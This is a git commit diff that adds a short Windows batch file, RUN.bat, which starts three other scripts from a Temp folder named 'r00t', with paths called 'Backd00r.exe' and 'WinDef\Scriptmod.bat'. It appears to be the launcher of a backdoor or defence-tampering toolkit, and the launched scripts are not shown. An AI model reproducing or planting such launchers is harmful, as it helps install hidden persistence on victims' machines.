1da89698769b869d90144ca4be90d47a3aa70c5d
0x01 <96843436+babysplly@users.noreply.github.com>
2024-09-28 10:36:49 +0700

    Add files via upload

---
+++ RUN.bat
@@ -0,0 +1,8 @@
+@echo off 
+
+start ''' "C:\Windows\Temp\r00t\Tools\Backd00r.exe\run.bat"
+timeout /t 1 /nobreak
+start ''' "C:\Windows\Temp\r00t\WinDef\Scriptmod.bat"
+timeout /t 1 /nobreak
+start"" "C:\Windows\Temp\r00t\Tools\co.bat"
+timeout /t 1 /nobreak
